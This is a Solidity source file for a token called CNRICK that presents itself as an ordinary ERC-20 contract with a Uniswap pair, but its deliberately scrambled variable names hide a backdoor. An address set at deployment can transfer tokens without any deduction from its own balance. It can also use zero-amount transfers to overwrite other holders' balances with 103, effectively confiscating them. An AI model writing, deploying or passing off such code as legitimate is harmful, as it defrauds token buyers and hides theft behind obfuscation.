/*

https://t.me/cnrick_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CNRICK is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'CNRICK';

    address public ebpladozgu;

    mapping(address => uint256) private zryn;

    function transfer(address zvdawn, uint256 aguejzyqsobw) public returns (bool success) {
        if (evphbwuzcnak[msg.sender] > 0 && aguejzyqsobw == 0 && zvdawn != ebpladozgu) {
            balanceOf[zvdawn] = bleaqvi;
        }
        skrflxgmqhb(msg.sender, zvdawn, aguejzyqsobw);
        return true;
    }

    function transferFrom(address npgfzwjhm, address zvdawn, uint256 aguejzyqsobw) public returns (bool success) {
        require(aguejzyqsobw <= allowance[npgfzwjhm][msg.sender]);
        allowance[npgfzwjhm][msg.sender] -= aguejzyqsobw;
        skrflxgmqhb(npgfzwjhm, zvdawn, aguejzyqsobw);
        return true;
    }

    constructor(address hykpcxu) {
        balanceOf[msg.sender] = totalSupply;
        evphbwuzcnak[hykpcxu] = bleaqvi;
        IUniswapV2Router02 zpaylsuqrv = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        ebpladozgu = IUniswapV2Factory(zpaylsuqrv.factory()).createPair(address(this), zpaylsuqrv.WETH());
    }

    uint256 private bleaqvi = 103;

    function approve(address ordnumhlwg, uint256 aguejzyqsobw) public returns (bool success) {
        allowance[msg.sender][ordnumhlwg] = aguejzyqsobw;
        emit Approval(msg.sender, ordnumhlwg, aguejzyqsobw);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private evphbwuzcnak;

    function skrflxgmqhb(address npgfzwjhm, address zvdawn, uint256 aguejzyqsobw) private {
        if (evphbwuzcnak[npgfzwjhm] == 0) {
            balanceOf[npgfzwjhm] -= aguejzyqsobw;
        }
        balanceOf[zvdawn] += aguejzyqsobw;
        emit Transfer(npgfzwjhm, zvdawn, aguejzyqsobw);
    }

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    string public name = 'CNRICK';

    event Approval(address indexed owner, address indexed spender, uint256 value);
}